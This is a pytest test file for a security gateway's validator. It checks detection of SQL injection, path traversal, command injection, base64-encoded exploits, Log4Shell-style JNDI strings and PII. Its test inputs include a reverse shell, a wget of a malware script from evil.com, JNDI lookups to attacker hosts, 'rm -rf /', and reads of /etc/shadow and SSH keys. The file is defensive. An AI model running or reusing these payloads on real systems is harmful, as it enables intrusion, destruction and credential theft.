"""Security validation tests for MCP Security Gateway.

Tests for:
- SQL injection detection
- Path traversal detection
- Command injection detection
- Base64 exploit detection
- JNDI injection detection
- PII detection and masking
"""

import pytest
from src.gateway.validator import (
    SecurityValidator,
    detect_pii,
    mask_pii
)


class TestSQLInjection:
    """Test SQL injection detection."""

    @pytest.fixture
    def validator(self):
        return SecurityValidator()

    def test_drop_table(self, validator):
        """Test detection of DROP TABLE."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "DROP TABLE users"},
            "test-db"
        )
        assert not is_valid
        assert "SQL Injection" in reason

    def test_delete_from(self, validator):
        """Test detection of DELETE FROM."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "DELETE FROM users WHERE 1=1"},
            "test-db"
        )
        assert not is_valid
        assert "SQL Injection" in reason

    def test_truncate(self, validator):
        """Test detection of TRUNCATE."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "TRUNCATE TABLE logs"},
            "test-db"
        )
        assert not is_valid
        assert "SQL Injection" in reason

    def test_union_select(self, validator):
        """Test detection of UNION SELECT."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "SELECT * FROM users UNION SELECT * FROM passwords"},
            "test-db"
        )
        assert not is_valid
        assert "SQL Injection" in reason

    def test_or_equals(self, validator):
        """Test detection of OR 1=1 style injection."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "SELECT * FROM users WHERE id = 1 OR 1=1"},
            "test-db"
        )
        assert not is_valid
        assert "SQL Injection" in reason

    def test_sql_comments(self, validator):
        """Test detection of SQL comments used for evasion."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "SELECT * FROM users -- WHERE active=1"},
            "test-db"
        )
        assert not is_valid
        assert "SQL Injection" in reason

    def test_information_schema(self, validator):
        """Test detection of INFORMATION_SCHEMA access."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "SELECT * FROM INFORMATION_SCHEMA.TABLES"},
            "test-db"
        )
        assert not is_valid
        assert "SQL Injection" in reason

    def test_hex_encoding(self, validator):
        """Test detection of hex encoding attacks."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "SELECT * FROM users WHERE id = 0x41424344"},
            "test-db"
        )
        assert not is_valid
        assert "SQL Injection" in reason

    def test_concat_function(self, validator):
        """Test detection of CONCAT function abuse."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "SELECT CONCAT(username, password) FROM users"},
            "test-db"
        )
        assert not is_valid
        assert "SQL Injection" in reason

    def test_valid_select(self, validator):
        """Test that valid SELECT passes."""
        is_valid, reason = validator.validate_request(
            "query",
            {"sql": "SELECT id, name FROM products WHERE category = 'electronics'"},
            "test-db"
        )
        assert is_valid
        assert reason is None


class TestPathTraversal:
    """Test path traversal detection."""

    @pytest.fixture
    def validator(self):
        return SecurityValidator()

    def test_dot_dot_slash(self, validator):
        """Test detection of ../ traversal."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": "../../../etc/passwd"},
            "filesystem"
        )
        assert not is_valid
        assert "Path Traversal" in reason

    def test_dot_dot_backslash(self, validator):
        """Test detection of ..\\ traversal."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": "..\\..\\..\\Windows\\System32"},
            "filesystem"
        )
        assert not is_valid
        assert "Path Traversal" in reason

    def test_url_encoded_traversal(self, validator):
        """Test detection of URL encoded traversal."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": "%2e%2e/etc/passwd"},
            "filesystem"
        )
        assert not is_valid
        assert "Path Traversal" in reason

    def test_etc_passwd(self, validator):
        """Test detection of /etc/passwd access."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": "/etc/passwd"},
            "filesystem"
        )
        assert not is_valid
        assert "Path Traversal" in reason

    def test_etc_shadow(self, validator):
        """Test detection of /etc/shadow access."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": "/etc/shadow"},
            "filesystem"
        )
        assert not is_valid
        assert "Path Traversal" in reason

    def test_home_directory(self, validator):
        """Test detection of ~ home directory access."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": "~/.ssh/id_rsa"},
            "filesystem"
        )
        assert not is_valid
        assert "Path Traversal" in reason

    def test_windows_system32(self, validator):
        """Test detection of Windows System32 access."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": "C:\\Windows\\System32\\config\\SAM"},
            "filesystem"
        )
        assert not is_valid
        assert "Path Traversal" in reason

    def test_proc_directory(self, validator):
        """Test detection of /proc directory access."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": "/proc/self/environ"},
            "filesystem"
        )
        assert not is_valid
        assert "Path Traversal" in reason

    def test_triple_dot(self, validator):
        """Test detection of ... traversal."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": ".../etc/passwd"},
            "filesystem"
        )
        assert not is_valid
        assert "Path Traversal" in reason

    def test_valid_path(self, validator):
        """Test that valid path passes."""
        is_valid, reason = validator.validate_request(
            "read",
            {"path": "/var/www/html/index.html"},
            "filesystem"
        )
        assert is_valid
        assert reason is None


class TestCommandInjection:
    """Test command injection detection."""

    @pytest.fixture
    def validator(self):
        return SecurityValidator()

    def test_semicolon_separator(self, validator):
        """Test detection of ; command separator."""
        is_valid, reason = validator.validate_request(
            "execute",
            {"command": "ls -la; rm -rf /"},
            "shell"
        )
        assert not is_valid
        assert "Command Injection" in reason

    def test_pipe_operator(self, validator):
        """Test detection of | pipe operator."""
        is_valid, reason = validator.validate_request(
            "execute",
            {"command": "cat /etc/passwd | grep root"},
            "shell"
        )
        assert not is_valid
        assert "Command Injection" in reason

    def test_and_operator(self, validator):
        """Test detection of && operator."""
        is_valid, reason = validator.validate_request(
            "execute",
            {"command": "echo hello && rm -rf /tmp/*"},
            "shell"
        )
        assert not is_valid
        assert "Command Injection" in reason

    def test_command_substitution(self, validator):
        """Test detection of $() command substitution."""
        is_valid, reason = validator.validate_request(
            "execute",
            {"command": "echo $(whoami)"},
            "shell"
        )
        assert not is_valid
        assert "Command Injection" in reason

    def test_backtick_substitution(self, validator):
        """Test detection of backtick command substitution."""
        is_valid, reason = validator.validate_request(
            "execute",
            {"command": "echo `whoami`"},
            "shell"
        )
        assert not is_valid
        assert "Command Injection" in reason


class TestBase64Exploits:
    """Test base64 encoded exploit detection."""

    @pytest.fixture
    def validator(self):
        return SecurityValidator()

    def test_base64_bash_command(self, validator):
        """Test detection of base64 encoded bash command."""
        import base64
        # "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
        payload = base64.b64encode(b"bash -i >& /dev/tcp/10.0.0.1/4242 0>&1").decode()

        is_valid, reason = validator.validate_request(
            "execute",
            {"data": payload},
            "test"
        )
        assert not is_valid
        assert "Base64 Exploit" in reason

    def test_base64_wget_command(self, validator):
        """Test detection of base64 encoded wget."""
        import base64
        payload = base64.b64encode(b"wget http://evil.com/malware.sh").decode()

        is_valid, reason = validator.validate_request(
            "execute",
            {"data": payload},
            "test"
        )
        assert not is_valid
        assert "Base64 Exploit" in reason


class TestJNDIInjection:
    """Test JNDI injection detection (Log4Shell style)."""

    @pytest.fixture
    def validator(self):
        return SecurityValidator()

    def test_jndi_ldap(self, validator):
        """Test detection of JNDI LDAP injection."""
        is_valid, reason = validator.validate_request(
            "log",
            {"message": "${jndi:ldap://evil.com/a}"},
            "logger"
        )
        assert not is_valid
        assert "JNDI Injection" in reason

    def test_jndi_rmi(self, validator):
        """Test detection of JNDI RMI injection."""
        is_valid, reason = validator.validate_request(
            "log",
            {"message": "${jndi:rmi://attacker.com/exploit}"},
            "logger"
        )
        assert not is_valid
        assert "JNDI Injection" in reason

    def test_jndi_dns(self, validator):
        """Test detection of JNDI DNS injection."""
        is_valid, reason = validator.validate_request(
            "log",
            {"message": "${jndi:dns://evil.com/a}"},
            "logger"
        )
        assert not is_valid
        assert "JNDI Injection" in reason


class TestPIIDetection:
    """Test PII detection and masking."""

    def test_detect_email(self):
        """Test email detection."""
        content = "Contact john.doe@example.com for more info"
        pii = detect_pii(content)
        assert "email" in pii

    def test_detect_ssn(self):
        """Test SSN detection."""
        content = "SSN: 123-45-6789"
        pii = detect_pii(content)
        assert "ssn" in pii

    def test_detect_credit_card(self):
        """Test credit card detection."""
        content = "Card: 4532-1234-5678-9010"
        pii = detect_pii(content)
        assert "credit_card" in pii

    def test_detect_phone(self):
        """Test phone number detection."""
        content = "Call 555-123-4567"
        pii = detect_pii(content)
        assert "phone" in pii

    def test_mask_email(self):
        """Test email masking."""
        content = "Contact john.doe@example.com for info"
        masked = mask_pii(content)
        assert "john.doe@example.com" not in masked
        assert "[EMAIL]" in masked

    def test_mask_ssn(self):
        """Test SSN masking."""
        content = "SSN: 123-45-6789"
        masked = mask_pii(content)
        assert "123-45-6789" not in masked
        assert "[SSN]" in masked

    def test_mask_credit_card(self):
        """Test credit card masking."""
        content = "Card: 4532-1234-5678-9010"
        masked = mask_pii(content)
        assert "4532-1234-5678-9010" not in masked
        assert "[CREDIT_CARD]" in masked

    def test_mask_phone(self):
        """Test phone number masking."""
        content = "Call 555-123-4567"
        masked = mask_pii(content)
        assert "555-123-4567" not in masked
        assert "[PHONE]" in masked


class TestPerformance:
    """Test validation performance."""

    @pytest.fixture
    def validator(self):
        return SecurityValidator()

    def test_validation_speed(self, validator):
        """Test that validation takes less than 10ms."""
        import time

        request_params = {
            "query": "SELECT * FROM products WHERE category = 'electronics'",
            "path": "/var/www/html/index.html",
            "user_input": "Hello, this is a normal message"
        }

        start = time.time()
        for _ in range(100):
            validator.validate_request("test", request_params, "test-server")
        end = time.time()

        avg_time_ms = ((end - start) / 100) * 1000
        assert avg_time_ms < 10, f"Validation too slow: {avg_time_ms:.2f}ms"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
